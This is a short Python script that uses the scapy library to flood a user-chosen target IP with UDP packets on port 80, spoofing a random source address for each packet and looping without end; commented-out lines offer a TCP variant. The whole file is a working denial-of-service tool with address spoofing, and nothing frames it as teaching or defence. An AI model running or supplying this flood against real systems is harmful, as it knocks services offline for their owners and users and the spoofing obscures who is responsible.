from scapy.all import *

target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number:"))
i = 1

def rand_ip():
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = "."

   rip = a + dot + b + dot + c + dot + d
   
   return rip

def rand_port():
   rport = random.randint(0,65535)

   return rport

while True:
   for source_port in range(1, 65535):
      source_ip = rand_ip()
      # source_port = rand_port()
      IP1 = IP(src = source_ip, dst = target_IP)
      # TCP1 = TCP(sport = source_port, dport = 80)
      UDP1 = UDP(sport = source_port, dport = 80)
      # pkt = IP1 / TCP1
      pkt = IP1 / UDP1
      send(pkt,inter = .001)
      print ("packet sent ", i)
      i = i + 1